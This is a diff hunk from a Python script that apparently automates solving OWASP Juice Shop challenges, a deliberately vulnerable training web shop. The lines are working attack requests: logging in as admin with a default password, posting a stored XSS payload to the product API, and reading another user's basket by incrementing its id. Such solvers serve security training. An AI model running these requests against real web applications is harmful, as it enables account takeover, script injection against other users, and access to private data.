@@ -82,7 +82,8 @@ for i in range(11):
 requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'z85','rating':3})
 
 # ==== Require to log in (admin account) ===
-with requests.session() as session:
-	login=loads(session.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'}).text)['authentication']
-	# ---- View Basket (View another user's shopping basket.)
-	session.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
+login=loads(requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'}).text)['authentication']
+# ---- API-only XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.)
+requests.post(url+'/api/Products', data={'name':'XSS','description':'<iframe src="javascript:alert(`xss`)">','price':47.11}, headers={'Authorization':'Bearer '+login['token']})
+# ---- View Basket (View another user's shopping basket.)
+requests.get(url+'/rest/basket/'+str(login['bid']+1), headers={'Authorization':'Bearer '+login['token']})
